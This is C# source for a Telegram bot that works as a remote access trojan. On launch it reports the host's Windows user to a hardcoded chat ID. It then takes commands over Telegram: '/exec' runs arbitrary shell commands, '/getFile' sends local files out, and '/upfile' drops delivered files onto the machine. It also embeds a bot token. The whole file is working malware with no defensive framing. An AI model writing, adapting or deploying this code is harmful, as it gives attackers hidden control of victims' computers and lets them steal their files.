using Newtonsoft.Json.Linq;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Web;
using static TeleBot_CangCot.Control;


namespace TeleBot_CangCot
{
    class Program
    {
        public static string botToken = "6525507053:AAHBZ6khXBZGCQEnOaDRhK8-4UOqA7WKm1U";
        public static string baseUrl = $"https://api.telegram.org/bot{botToken}/";


        static void Main(string[] args)
        {
            SendMessage("1146104261", "New Connected!", ExecuteCommand("powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"));
            Thread runThread = new Thread(run);
            runThread.Start();

            runThread.Join();
        }
        

        public static void run()
        {
            string tempPath = Path.GetTempPath();
            string folderName = "Cang_Cot";
            string folderPath = Path.Combine(tempPath, folderName);

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            
            while (true)
            {

                try
                {


                    string updateData = getUpdatesData();
                    JObject data = JObject.Parse(updateData);
                    long currentTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                    
                    foreach (var result in data["result"])
                    {
                        
                        long date = (long)result["message"]["date"];
                        if (currentTime - date < 5)
                        {
                            string text = (string)result["message"]["text"];
                            string chatId = (string)result["message"]["chat"]["id"];
                            string userId = (string)result["message"]["from"]["id"];
                            if (text!=null)
                            {
                                if (text.StartsWith("/start"))
                                    SendMessage(chatId, text, "Cang cot cang cot");
                                else if (text.StartsWith("/hi"))
                                    SendMessage(chatId, text, "Hello");
                                else if (text.StartsWith("/bye"))
                                    SendMessage(chatId, text, "Bye Bye");
                                else if (text.StartsWith("/exec"))
                                {
                                    string cmd = text.Substring(6);
                                    if (cmd == null)
                                        cmd = "whoami";
                                    string resultText = ExecuteCommand(cmd);
                                    SendMessage(chatId, text, resultText);
                                }
                                else if (text.StartsWith("/getFile"))
                                {
                                    string filePath = text.Substring(9);
                                    if (filePath != null)
                                    {
                                        sendDocument(chatId, text, filePath);
                                    }
                                    else
                                    {
                                        SendMessage(chatId, text, "Error");
                                    }
                                }
                            }
                            else
                            {
                                string caption = (string)result["message"]["caption"];
                                string savePath;
                                if (caption.StartsWith("/upfile"))
                                {
                                    try
                                    {
                                        savePath = caption.Substring(8);
                                        if (!File.Exists(savePath))
                                        {
                                            savePath = folderPath;
                                        }
                                    }
                                    catch (ArgumentOutOfRangeException)
                                    {
                                        savePath = folderPath;
                                    }
                                    string file_id = result["message"].Children().ElementAt(4).SelectTokens("$..file_id").Last().ToString();
                                    Console.WriteLine(file_id);
                                    if (file_id != null) 
                                    {
                                        string filename = upFile(file_id, savePath);
                                        SendMessage(chatId, caption, filename);
                                    }
                                    
                                    
                                }
                                
                            }


                        }
                    }
                }
                catch (Exception e) {
                    Console.WriteLine (e.Message);
                    continue;
                }
                Thread.Sleep(5000);
            }
        }

        
    }
}